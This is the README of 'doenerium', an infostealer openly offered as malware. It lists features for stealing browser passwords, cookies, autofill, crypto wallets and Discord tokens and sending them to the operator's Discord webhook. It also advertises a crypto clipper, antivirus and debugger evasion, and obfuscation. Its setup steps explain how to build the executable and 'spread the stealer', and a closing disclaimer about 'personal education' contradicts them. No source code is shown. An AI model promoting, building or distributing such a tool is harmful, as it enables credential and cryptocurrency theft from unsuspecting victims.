<center>
    <img src="https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp"/>
    <h2><strong>doenerium | If you can't compile to exe, join on the discord server for a solution</strong></h2>
    <h4>Fully undetected stealer (0/67)</h4>
</center>

<p align='center'>
    <a href='https://nodejs.org/en/download/' align='center'>
        <img alt='NodeJS' src='https://nodejs.org/static/images/logo.svg' width="100" height="100">
    </a>
</p>

## Information:
- [New Discord](https://discord.gg/eYQYJhWcPa)

## Features
- Fully undetected (0/65 detects)
- Very detailed user info (PC hostname, CPU, RAM, ...)
- Sends a screenshot to your webhook when executing the stealer
- Grabs executable info (path where the .exe was executed, ...)
- Searches for wallets in system and grabs them
- Grabs passwords, cookies, bookmarks & Extension cookies from all major browsers (Chrome, Opera, Brave, Yandex, Microsoft Edge)
- Silently saves all data separate in a zip file in a hidden folder and sends it to your webhook
- Modifies discord's desktop core (like known grabbers such as bbystealer & PirateStealer aka. Brooklyn/Arizona)
- Checks for debugging processes to avoid your webhook skid being reversed from skids (loop)
- Ultra high quality obfuscation
- Easy to setup (just modify the "config.js" file)
- Sends everything to your webhook in beautiful embeds
- Analyzes the data which was stolen and sends a zip file to your discord webhook
- Browser autofill grabber
- Browser history grabber
- Crypto clipper
- Searches for keywords in cookies, passwords, autofill and lists them on the top of the cookie/password/autofill log files
- Validates found discord tokens & if they work they only get sent to your webhook
- Discord backup codes finder

## Setup:
- Download the files
- Install [NodeJS](https://nodejs.org/en/download/) and [Visual Studio](https://visualstudio.microsoft.com/de/downloads/) and C++ in Visual Studio
- Install the required packages by running `install.bat`
- Edit the `config.js` file and put your webhooks in it
- Run the `build.bat` file and an .exe file named `index-win.exe` will be created
- Spread the stealer and enjoy my fully undetected stealer :flushed:

## Showcase:

https://www.virustotal.com/gui/file/06d2ab510cfb2716c835897e5b8ea7509e8d4ff24b36f526802bd51f244bea30/detection

<img src="https://cdn.discordapp.com/attachments/972873604029087805/972879042283978772/unknown.png">
<img src="https://media.discordapp.net/attachments/972873604029087805/972873827669397524/unknown.png">
<img src="https://cdn.discordapp.com/attachments/972873604029087805/972873884342812743/unknown.png">
<img src="https://cdn.discordapp.com/attachments/972873604029087805/972878969458266212/unknown.png">
<img src="https://cdn.discordapp.com/attachments/972873604029087805/972873784694571088/unknown.png">
<img src="https://cdn.discordapp.com/attachments/972873604029087805/972873611222347786/unknown.png">
<img src="https://cdn.discordapp.com/attachments/972873604029087805/972873645858914304/unknown.png">


## TODO
- Exodus wallet injection (get the password whenever the user logs in the wallet)
- More grabbers (VPN's, Gaming, Messengers)
- Keylogger
- Growtopia stealer
- Discord bot to build within discord ($build <webhook_url>)
- Dynamic encryption

### Inspirations
- [44 CALIBER STEALER](https://github.com/razexgod/44CALIBER)
- [Stealerium](https://github.com/Stealerium/Stealerium)
- PirateStealer & bbystealer

## License:
By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see https://commonsclause.com/.

## Note:
I am not responsible for any damages this software may cause.
This was made for personal education.
